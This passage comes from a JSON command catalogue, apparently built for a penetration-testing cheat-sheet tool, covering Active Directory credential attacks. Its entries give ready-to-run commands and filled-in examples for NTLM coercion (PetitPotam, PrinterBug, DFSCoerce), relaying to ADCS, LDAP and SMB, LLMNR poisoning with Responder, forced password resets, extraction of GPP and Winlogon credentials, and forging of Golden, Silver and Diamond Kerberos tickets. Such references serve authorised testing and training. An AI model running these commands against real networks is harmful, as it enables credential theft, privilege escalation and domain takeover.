        "coercer scan -u jdoe -p 'Password123!' -d corp.local -t 10.10.10.20",
        "coercer coerce -u jdoe -p 'Password123!' -d corp.local -t 10.10.10.20 -l 10.10.14.5"
      ]
    },
    {
      "id": "dfscoerce",
      "name": "DFSCoerce",
      "command": "python3 dfscoerce.py <listener_ip> <target_ip>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Coerce NTLM authentication using MS-DFSNM (Distributed File System)",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "rpc",
        "ntlm"
      ],
      "tags": [
        "dfscoerce",
        "coercion",
        "ntlm",
        "dfs",
        "relay"
      ],
      "variations": [
        {
          "label": "With Credentials",
          "requires": "password",
          "command": "python3 dfscoerce.py -d '<domain>' -u '<user>' -p '<password>' <listener_ip> <target_ip>"
        }
      ],
      "examples": [
        "python3 dfscoerce.py 192.168.1.50 192.168.1.100",
        "python3 dfscoerce.py -d 'corp.local' -u 'user' -p 'password' 192.168.1.50 192.168.1.100"
      ]
    },
    {
      "id": "nxc-coerce-plus",
      "name": "NetExec coerce_plus Module",
      "command": "nxc smb <target> -u '<user>' -p '<password>' -M coerce_plus -o LISTENER=<attacker-ip>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Unified coercion module — replaces the individual petitpotam/printerbug/dfscoerce/shadowcoerce/mserven modules. Tries every known coercion method (or one selected via METHOD) and triggers SMB authentication back to your listener. The recommended entry point in NetExec v1.4+ for any coerce-then-relay chain.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "netexec",
        "nxc",
        "coerce_plus",
        "petitpotam",
        "printerbug",
        "dfscoerce",
        "ntlm-relay"
      ],
      "variations": [
        {
          "label": "Specific Method",
          "requires": "password",
          "command": "nxc smb <target> -u '<user>' -p '<password>' -M coerce_plus -o LISTENER=<attacker-ip> METHOD=dfscoerce"
        },
        {
          "label": "Continue On Failure",
          "requires": "password",
          "command": "nxc smb <target> -u '<user>' -p '<password>' -M coerce_plus -o LISTENER=<attacker-ip> ALWAYS_CONTINUE=true"
        }
      ],
      "references": [
        {
          "title": "NetExec coerce_plus",
          "url": "https://www.netexec.wiki/smb-protocol/coerce_plus"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.20 -u jdoe -p 'Password123!' -M coerce_plus -o LISTENER=10.10.14.5"
      ]
    },
    {
      "id": "nxc-smb-gen-relay-list",
      "name": "NetExec Generate Relay Target List",
      "command": "nxc smb <subnet> --gen-relay-list <relay_targets.txt>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Scan a subnet over SMB and write a file containing every host with SMB signing disabled. The resulting list is what you feed to ntlmrelayx.py -tf for NTLM relay attacks.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "netexec",
        "smb-signing",
        "ntlm-relay",
        "recon"
      ],
      "references": [
        {
          "title": "NetExec — SMB Protocol",
          "url": "https://www.netexec.wiki/smb-protocol"
        },
        {
          "title": "The Hacker Recipes — NTLM Relay",
          "url": "https://www.thehacker.recipes/ad/movement/ntlm/relay"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt",
        "ntlmrelayx.py -tf relay_targets.txt -smb2support"
      ]
    },
    {
      "id": "nxc-mssql-coerce",
      "name": "NetExec mssql_coerce Module",
      "command": "nxc mssql <target> -u '<user>' -p '<password>' -M mssql_coerce -o LISTENER=<attacker-ip>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Coerce the MSSQL service account to authenticate to your relay listener via xp_dirtree / xp_subdirs / xp_fileexist. Lights up the path to NTLM relay against any SQL service account that's actually a domain account.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "mssql"
      ],
      "tags": [
        "netexec",
        "nxc",
        "mssql",
        "coerce",
        "ntlm-relay"
      ],
      "examples": [
        "nxc mssql 10.10.10.10 -u sa -p 'Password123!' --local-auth -M mssql_coerce -o LISTENER=10.10.14.5"
      ]
    },
    {
      "id": "nxc-smb-petitpotam",
      "name": "NetExec PetitPotam Coercion",
      "command": "nxc smb <ip> -u <user> -p <password> -M petitpotam -o LISTENER=<attacker_ip>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Coerce a Windows host (typically a DC) to authenticate back to the attacker via the EFSRPC interface (PetitPotam). Pair with ntlmrelayx.py -t http://<ca>/certsrv/certfnh.asp for ESC8.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "nxc",
        "netexec",
        "petitpotam",
        "coercion",
        "ntlm-relay",
        "efsrpc"
      ],
      "variations": [
        {
          "label": "Unauthenticated (Pre-Patch)",
          "requires": "no-creds",
          "command": "nxc smb <ip> -u '' -p '' -M petitpotam -o LISTENER=<attacker_ip>"
        },
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb <ip> -u <user> -H <hash> -M petitpotam -o LISTENER=<attacker_ip>"
        }
      ],
      "references": [
        {
          "title": "NetExec — petitpotam module",
          "url": "https://www.netexec.wiki/smb-protocol/modules/petitpotam"
        },
        {
          "title": "PetitPotam Original PoC",
          "url": "https://github.com/topotam/PetitPotam"
        }
      ],
      "examples": [
        "nxc smb dc01.corp.local -u jdoe -p 'Password123!' -M petitpotam -o LISTENER=10.10.14.5",
        "ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnh.asp --adcs --template DomainController"
      ]
    },
    {
      "id": "nxc-smb-coerce-plus",
      "name": "NetExec SMB Coerce Plus",
      "command": "nxc smb '<ip>' -u '' -p '' -M coerce_plus -o LISTENER=<listener_ip>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Trigger NTLM authentication coercion using multiple methods (PetitPotam, PrinterBug, etc.) without credentials",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "coerce",
        "ntlm-relay",
        "petitpotam",
        "printerbug",
        "unauthenticated"
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u '' -p '' -M coerce_plus -o LISTENER=192.168.1.50"
      ]
    },
    {
      "id": "nxc-smb-ntlmv1",
      "name": "NetExec SMB NTLMv1 Check",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M ntlmv1",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Check if NTLMv1 authentication is accepted on remote hosts (enables downgrade attacks)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "ntlmv1",
        "downgrade",
        "ntlm-relay",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M ntlmv1"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.0/24' -u 'user' -p 'password' -M ntlmv1"
      ]
    },
    {
      "id": "nxc-smb-shadowcoerce",
      "name": "NetExec SMB ShadowCoerce",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M shadowcoerce -o LISTENER=<listener_ip>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Coerce NTLM authentication via the VSS shadow copy API (ShadowCoerce)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "shadowcoerce",
        "vss",
        "ntlm-relay",
        "coerce"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M shadowcoerce -o LISTENER=<listener_ip>"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M shadowcoerce -o LISTENER=192.168.1.50"
      ]
    },
    {
      "id": "ntlmrelayx-adcs",
      "name": "NTLM Relay to ADCS",
      "command": "impacket-ntlmrelayx -t http://<ip>/certsrv/certfnsh.asp --adcs --template '<template>'",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Relay NTLM authentication to ADCS web enrollment to obtain a certificate",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "ntlm",
        "http"
      ],
      "tags": [
        "impacket",
        "ntlmrelay",
        "relay",
        "adcs",
        "esc8",
        "certificate"
      ],
      "examples": [
        "impacket-ntlmrelayx -t http://192.168.1.100/certsrv/certfnsh.asp --adcs --template 'DomainController'"
      ]
    },
    {
      "id": "ntlmrelayx-ldap",
      "name": "NTLM Relay to LDAP",
      "command": "impacket-ntlmrelayx -t ldap://<ip> --delegate-access",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Relay NTLM authentication to LDAP to configure RBCD delegation",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "ldap",
        "ntlm"
      ],
      "tags": [
        "impacket",
        "ntlmrelay",
        "relay",
        "ldap",
        "rbcd",
        "delegation"
      ],
      "examples": [
        "impacket-ntlmrelayx -t ldap://192.168.1.100 --delegate-access"
      ]
    },
    {
      "id": "ntlmrelayx-smb",
      "name": "NTLM Relay to SMB",
      "command": "impacket-ntlmrelayx -t smb://<ip> -dh -smb2support --enum-local-admins",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "NTLM relay attack targeting SMB service",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb",
        "ntlm"
      ],
      "tags": [
        "impacket",
        "ntlmrelay",
        "relay",
        "smb"
      ],
      "references": [
        {
          "title": "NTLM Theft Tool",
          "url": "https://github.com/Greenwolf/ntlm_theft"
        },
        {
          "title": "NTLM Relay Theory",
          "url": "https://www.thehacker.recipes/ad/movement/ntlm/relay"
        }
      ],
      "examples": [
        "impacket-ntlmrelayx -t smb://192.168.1.100 -dh -smb2support --enum-local-admins"
      ]
    },
    {
      "id": "ntlmrelayx-ldaps",
      "name": "ntlmrelayx → LDAPS (Add Computer / RBCD / Shadow Creds)",
      "command": "impacket-ntlmrelayx -t ldaps://<dc-ip> --delegate-access --escalate-user '<attacker>' --no-smb-server",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Relay coerced authentication to LDAPS — required when MIC and channel binding force LDAP signing. Common payloads: --add-computer (then RBCD), --delegate-access (set msDS-AllowedToActOnBehalfOfOtherIdentity), --shadow-credentials.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "ldap",
        "ntlm"
      ],
      "tags": [
        "impacket",
        "ntlmrelayx",
        "relay",
        "ldaps",
        "rbcd",
        "shadow-credentials"
      ],
      "variations": [
        {
          "label": "Add Computer",
          "requires": "no-creds",
          "command": "impacket-ntlmrelayx -t ldaps://<dc-ip> --add-computer ATTACKERPC --no-smb-server"
        },
        {
          "label": "Shadow Credentials",
          "requires": "no-creds",
          "command": "impacket-ntlmrelayx -t ldaps://<dc-ip> --shadow-credentials --shadow-target '<victim>' --no-smb-server"
        },
        {
          "label": "Dump Domain",
          "requires": "no-creds",
          "command": "impacket-ntlmrelayx -t ldaps://<dc-ip> --dump-laps --dump-gmsa --no-smb-server"
        }
      ],
      "references": [
        {
          "title": "ntlmrelayx",
          "url": "https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py"
        }
      ],
      "examples": [
        "impacket-ntlmrelayx -t ldaps://10.10.10.10 --delegate-access --escalate-user jdoe --no-smb-server"
      ]
    },
    {
      "id": "ntlmrelayx-smb-socks",
      "name": "ntlmrelayx SOCKS Proxy",
      "command": "impacket-ntlmrelayx -tf <targets.txt> -socks -smb2support",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Run ntlmrelayx in SOCKS mode to keep relayed sessions alive after the initial authentication. Drive them with proxychains + impacket tools (smbexec, secretsdump, smbclient) using -no-pass and the relayed user.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb",
        "ntlm"
      ],
      "tags": [
        "impacket",
        "ntlmrelayx",
        "socks",
        "relay",
        "proxychains"
      ],
      "references": [
        {
          "title": "ntlmrelayx SOCKS",
          "url": "https://www.thehacker.recipes/a-d/movement/ntlm/relay"
        }
      ],
      "examples": [
        "impacket-ntlmrelayx -tf targets.txt -socks -smb2support",
        "proxychains impacket-secretsdump CORP/jdoe@10.10.10.10 -no-pass"
      ]
    },
    {
      "id": "petitpotam",
      "name": "PetitPotam Coercion",
      "command": "python3 PetitPotam.py <listener_ip> <target_ip>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Coerce NTLM authentication from a target using MS-EFSRPC (PetitPotam)",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "rpc",
        "ntlm"
      ],
      "tags": [
        "petitpotam",
        "coercion",
        "efsrpc",
        "ntlm",
        "relay"
      ],
      "variations": [
        {
          "label": "With Credentials",
          "requires": "password",
          "command": "python3 PetitPotam.py -u '<user>' -p '<password>' -d '<domain>' <listener_ip> <target_ip>"
        }
      ],
      "examples": [
        "python3 PetitPotam.py 192.168.1.50 192.168.1.100",
        "python3 PetitPotam.py -u 'user' -p 'password' -d 'corp.local' 192.168.1.50 192.168.1.100"
      ]
    },
    {
      "id": "printerbug",
      "name": "PrinterBug / SpoolSample",
      "command": "python3 printerbug.py '<domain>/<user>:<password>'@<target_ip> <listener_ip>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Coerce NTLM authentication using the Print Spooler service (MS-RPRN)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rpc",
        "ntlm"
      ],
      "tags": [
        "printerbug",
        "spoolsample",
        "coercion",
        "ntlm",
        "spooler"
      ],
      "examples": [
        "python3 printerbug.py 'corp.local/user:password'@192.168.1.100 192.168.1.50"
      ]
    },
    {
      "id": "responder",
      "name": "Responder",
      "command": "responder -I <interface> -dwv",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Poison LLMNR, NBT-NS, and mDNS to capture NTLM hashes on the network",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "ntlm"
      ],
      "tags": [
        "responder",
        "llmnr",
        "nbt-ns",
        "mdns",
        "poisoning",
        "ntlm",
        "capture"
      ],
      "examples": [
        "responder -I eth0 -dwv"
      ]
    },
    {
      "id": "bloodyad-add-uac",
      "name": "bloodyAD add uac",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' add uac '<target>' -f DONT_REQ_PREAUTH",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Toggle UserAccountControl flags on a target account. Setting DONT_REQ_PREAUTH on a user you control (via writeAccountRestrictions) makes them AS-REP roastable on demand. Other useful flags: TRUSTED_FOR_DELEGATION, ACCOUNTDISABLE.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "uac",
        "as-rep-roast",
        "acl-abuse"
      ],
      "variations": [
        {
          "label": "Remove Flag",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' remove uac '<target>' -f DONT_REQ_PREAUTH"
        },
        {
          "label": "Unconstrained Delegation",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' add uac '<target>' -f TRUSTED_FOR_DELEGATION"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add uac svc_app -f DONT_REQ_PREAUTH"
      ]
    },
    {
      "id": "bloodyad-force-password",
      "name": "BloodyAD Force Password Change",
      "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' -p '<password>' set password '<target_user>' '<new_password>'",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Force password change using BloodyAD",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "password",
        "force-change",
        "credential-attack"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' --hashes ':<hash>' set password '<target_user>' '<new_password>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "bloodyAD --host '<ip>' -d '<domain>' -k set password '<target_user>' '<new_password>'"
        }
      ],
      "examples": [
        "bloodyAD --host '192.168.1.100' -d 'CORP.LOCAL' -u 'user' -p 'password' set password 'targetuser' 'NewP@ss123'"
      ]
    },
    {
      "id": "bloodyad-set-password",
      "name": "bloodyAD Set Password",
      "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> set password <target_user> <new_password>",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Reset another user's password if you have ForceChangePassword (User-Force-Change-Password extended right) on them. Bread-and-butter ACL-abuse path — typically gained via BloodHound paths.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "password-reset",
        "acl-abuse",
        "force-change-password"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p :<hash> set password <target_user> <new_password>"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "KRB5CCNAME=<ccache> bloodyAD --host <dc-fqdn> -d <domain> -u <user> -k set password <target_user> <new_password>"
        }
      ],
      "references": [
        {
          "title": "bloodyAD docs",
          "url": "https://github.com/CravateRouge/bloodyAD/wiki"
        },
        {
          "title": "The Hacker Recipes — ForceChangePassword",
          "url": "https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' set password svc_sql 'NewP@ssw0rd!'"
      ]
    },
    {
      "id": "impacket-changepasswd",
      "name": "Impacket changepasswd",
      "command": "impacket-changepasswd '<domain>/<user>:<password>'@'<ip>' -newpass '<new_password>' -altuser '<target_user>'",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Change an AD user's password via RPC (requires appropriate ACL rights)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rpc",
        "smb"
      ],
      "tags": [
        "impacket",
        "password-change",
        "acl",
        "force-change-password",
        "rpc"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-changepasswd -hashes ':<hash>' '<domain>/<user>'@'<ip>' -newpass '<new_password>' -altuser '<target_user>'"
        }
      ],
      "examples": [
        "impacket-changepasswd 'CORP.LOCAL/user:password'@192.168.1.100 -newpass 'NewPass123!' -altuser 'victim'"
      ]
    },
    {
      "id": "impacket-Get-GPPPassword",
      "name": "Impacket Get-GPPPassword",
      "command": "impacket-Get-GPPPassword -xmlfile Groups.xml",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Decrypt Group Policy Preference (GPP) passwords from XML files",
      "platform": "linux",
      "requires": [
        "shell"
      ],
      "tags": [
        "impacket",
        "gpp",
        "group-policy",
        "password",
        "sysvol"
      ],
      "examples": [
        "impacket-Get-GPPPassword -xmlfile Groups.xml"
      ]
    },
    {
      "id": "net-rpc-password",
      "name": "Net RPC Password Change",
      "command": "net rpc password '<user>' '<password>' -U '<domain>'/'<user>'%'<password>' -S '<ip>'",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Force password change via Net RPC",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rpc"
      ],
      "tags": [
        "net",
        "rpc",
        "password",
        "change"
      ],
      "examples": [
        "net rpc password 'target_user' 'newPassword123' -U 'CORP'/'admin'%'password' -S '192.168.1.100'"
      ]
    },
    {
      "id": "nxc-change-password",
      "name": "NetExec change-password Module",
      "command": "nxc smb <target> -u '<user>' -p '<old-password>' -M change-password -o NEWPASS='<new-password>'",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Reset a user's password when they are flagged STATUS_PASSWORD_MUST_CHANGE — typical after a freshly-spawned account or post-coercion. Works without needing existing valid auth, since the must-change pre-auth is its own state. Added in NetExec v1.5.0.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "change-password",
        "must-change",
        "password-reset"
      ],
      "references": [
        {
          "title": "NetExec v1.5.0",
          "url": "https://github.com/Pennyw0rth/NetExec/releases"
        }
      ],
      "examples": [
        "nxc smb dc.corp.local -u newuser -p 'TempPass1!' -M change-password -o NEWPASS='AttackerPass1!'"
      ]
    },
    {
      "id": "nxc-smb-gpp-autologin",
      "name": "NetExec SMB GPP AutoLogin",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M gpp_autologin",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Search Group Policy Preferences for AutoLogon credentials stored in SYSVOL",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "gpp",
        "autologin",
        "sysvol",
        "credential-dumping"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M gpp_autologin"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache -M gpp_autologin"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M gpp_autologin"
      ]
    },
    {
      "id": "nxc-smb-gpp-password",
      "name": "NetExec SMB GPP Password",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M gpp_password",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Search SYSVOL for Group Policy Preference XML files containing encrypted passwords",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "gpp",
        "group-policy",
        "sysvol",
        "credential-dumping"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M gpp_password"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache -M gpp_password"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M gpp_password"
      ]
    },
    {
      "id": "nxc-smb-winlogon",
      "name": "NetExec SMB Winlogon Credentials",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M reg-winlogon",
      "category": "credential-attacks",
      "subcategory": "password-manipulation",
      "description": "Extract AutoLogon credentials from the Winlogon registry key on remote hosts",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "winlogon",
        "autologon",
        "registry",
        "credential-dumping"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M reg-winlogon"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'administrator' -p 'password' -M reg-winlogon"
      ]
    },
    {
      "id": "impacket-describeTicket",
      "name": "Impacket describeTicket",
      "command": "impacket-describeTicket '<ticket.ccache>'",
      "category": "credential-attacks",
      "subcategory": "ticket-attacks",
      "description": "Parse and display the contents of a Kerberos ticket (.ccache or .kirbi)",
      "platform": "linux",
      "requires": [
        "ticket"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "kerberos",
        "ticket",
        "analysis",
        "ccache",
        "kirbi"
      ],
      "examples": [
        "impacket-describeTicket 'administrator.ccache'"
      ]
    },
    {
      "id": "diamond-ticket",
      "name": "Impacket Diamond Ticket",
      "command": "impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> -request -user <low_priv_user> -password <low_priv_password> -impersonate <target_user> -duration 10 <user_to_impersonate>",
      "category": "credential-attacks",
      "subcategory": "ticket-attacks",
      "description": "Forge a Diamond Ticket: request a legitimate TGT from the KDC and then patch its PAC with custom group memberships using the krbtgt key. Looks identical to a normal TGT in logs (proper KDC encryption metadata), unlike a Golden Ticket which is fully fabricated.",
      "platform": "linux",
      "requires": [
        "hash"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "diamond-ticket",
        "tgt",
        "krbtgt",
        "stealth",
        "forgery"
      ],
      "references": [
        {
          "title": "Semperis — Diamond Ticket",
          "url": "https://www.semperis.com/blog/diamond-and-sapphire-tickets-the-evolution-of-golden-ticket/"
        },
        {
          "title": "Impacket — ticketer.py",
          "url": "https://github.com/fortra/impacket/blob/master/examples/ticketer.py"
        }
      ],
      "examples": [
        "impacket-ticketer -nthash 5f4dcc3b5aa765d61d8327deb882cf99 -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local -request -user jdoe -password 'Password123!' -impersonate administrator -duration 10 administrator"
      ]
    },
    {
      "id": "impacket-getPac",
      "name": "Impacket getPac",
      "command": "impacket-getPac -targetUser <target_user> '<domain>/<user>:<password>'",
      "category": "credential-attacks",
      "subcategory": "ticket-attacks",
      "description": "Retrieve the PAC (Privilege Attribute Certificate) for a target user via the S4U2self extension. Useful for inspecting group memberships from a low-privileged context, validating that S4U is allowed, and as a building block for delegation attacks.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "pac",
        "s4u2self",
        "kerberos",
        "delegation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-getPac -targetUser <target_user> -hashes ':<hash>' '<domain>/<user>'"
        }
      ],
      "references": [
        {
          "title": "Impacket — getPac.py",
          "url": "https://github.com/fortra/impacket/blob/master/examples/getPac.py"
        }
      ],
      "examples": [
        "impacket-getPac -targetUser administrator 'CORP/jdoe:Password123!'"
      ]
    },
    {
      "id": "golden-ticket",
      "name": "Impacket Golden Ticket",
      "command": "impacket-ticketer -nthash '<hash>' -domain-sid '<domain_sid>' -domain '<domain>' -spn 'krbtgt/<domain>' '<user>'",
      "category": "credential-attacks",
      "subcategory": "ticket-attacks",
      "description": "Forge a Golden Ticket (TGT) using the krbtgt NTLM hash",
      "platform": "linux",
      "requires": [
        "hash"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "golden-ticket",
        "tgt",
        "krbtgt",
        "persistence",
        "forgery"
      ],
      "examples": [
        "impacket-ticketer -nthash 'aad3b435b51404eeaad3b435b51404ee' -domain-sid 'S-1-5-21-1234567890-1234567890-1234567890' -domain 'corp.local' -spn 'krbtgt/corp.local' 'administrator'"
      ]
    },
    {
      "id": "silver-ticket",
      "name": "Impacket Silver Ticket",
      "command": "impacket-ticketer -nthash '<hash>' -domain-sid '<domain_sid>' -domain '<domain>' -spn '<service>/<target_host>' '<user>'",
      "category": "credential-attacks",
      "subcategory": "ticket-attacks",
      "description": "Forge a Silver Ticket (TGS) for a specific service using its NTLM hash",
      "platform": "linux",
      "requires": [
        "hash"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "silver-ticket",
        "tgs",
        "service-ticket",
        "forgery"
      ],
      "examples": [
        "impacket-ticketer -nthash 'e19ccf75ee54e06b06a5907af13cef42' -domain-sid 'S-1-5-21-1234567890-1234567890-1234567890' -domain 'corp.local' -spn 'cifs/dc01.corp.local' 'administrator'"
      ]
    },
    {
      "id": "ticket-converter",
      "name": "Impacket Ticket Converter",
      "command": "impacket-ticketConverter '<input_file>' '<output_file>'",
      "category": "credential-attacks",
      "subcategory": "ticket-attacks",
      "description": "Convert Kerberos tickets between kirbi (Windows) and ccache (Linux) formats",
      "platform": "linux",
      "requires": [
        "ticket"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "ticket",
        "converter",
        "kirbi",
        "ccache"
      ],
      "examples": [
        "impacket-ticketConverter 'ticket.kirbi' 'ticket.ccache'",
        "impacket-ticketConverter 'ticket.ccache' 'ticket.kirbi'"
      ]
    },
    {
      "id": "impacket-ticketer-golden",
      "name": "Impacket ticketer.py Golden Ticket",
      "command": "impacket-ticketer -nthash <krbtgt-nt-hash> -domain-sid <domain-sid> -domain '<domain>' '<user>'",
      "category": "credential-attacks",
      "subcategory": "ticket-attacks",
      "description": "Forge a Golden Ticket (TGT signed with the krbtgt key) granting any user, any privilege, until the krbtgt password is rotated twice. Save the resulting .ccache and export KRB5CCNAME to use it.",
      "platform": "linux",
      "requires": [
        "hash"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "ticketer",
        "golden-ticket",
        "krbtgt",
        "forgery"
      ],
      "variations": [
        {
          "label": "AES Key",
          "requires": "aes-key",
          "command": "impacket-ticketer -aesKey <aes256-key> -domain-sid <domain-sid> -domain '<domain>' '<user>'"
        },
        {
          "label": "Silver Ticket (Service)",
          "requires": "hash",
          "command": "impacket-ticketer -nthash <service-nt-hash> -domain-sid <domain-sid> -domain '<domain>' -spn '<spn>' '<user>'"
        }
      ],
      "references": [
        {
          "title": "Impacket ticketer",
          "url": "https://github.com/fortra/impacket/blob/master/examples/ticketer.py"
        }
      ],
      "examples": [
        "impacket-ticketer -nthash aad3b...e0c089c0 -domain-sid S-1-5-21-... -domain corp.local administrator",
        "export KRB5CCNAME=$(pwd)/administrator.ccache",
        "impacket-secretsdump -k -no-pass corp.local/administrator@dc.corp.local"
      ]
    },
    {
      "id": "bloodhound-ce-python",
